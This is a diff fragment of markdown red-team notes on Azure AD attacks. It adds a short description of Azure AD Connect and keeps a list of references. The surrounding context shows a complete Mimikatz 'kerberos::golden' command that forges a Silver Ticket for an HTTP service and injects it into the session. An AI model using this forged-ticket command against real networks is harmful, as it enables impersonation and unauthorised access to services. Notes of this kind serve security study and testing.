@@ -42,7 +42,16 @@ In order to do so, the following parameters are required:
 **Having this information we can now create and use the Silver Ticket on any Windows computer connected to the internet Service**
 ```
 kerberos::golden /user:NyaMeeEain /domain:insomnia.com /rc4:f9969e088b2c13d93833d0ce436c76dd /sid:S-1-5-21-2121516926-2695613149-3163776784 /id:1234 /target:XXXXXXX.net /service:HTTP /ptt
+
 ```
+# # Azure AD Connect
+Azure AD Connect is a Microsoft tool designed to facilitate hybrid infrastructure deployments, between on-premise and cloud.
+
+![SSO](https://docs.microsoft.com/en-us/azure/active-directory/hybrid/media/whatis-hybrid-identity/arch.png)
+
+
+
+
 # References
 * [AZURE AD INTRODUCTION FOR RED TEAMERS](https://www.synacktiv.com/en/publications/azure-ad-introduction-for-red-teamers.html)
 * [Password Hash Sync Deep Dive](https://www.eshlomo.us/password-hash-sync-deep-dive/)
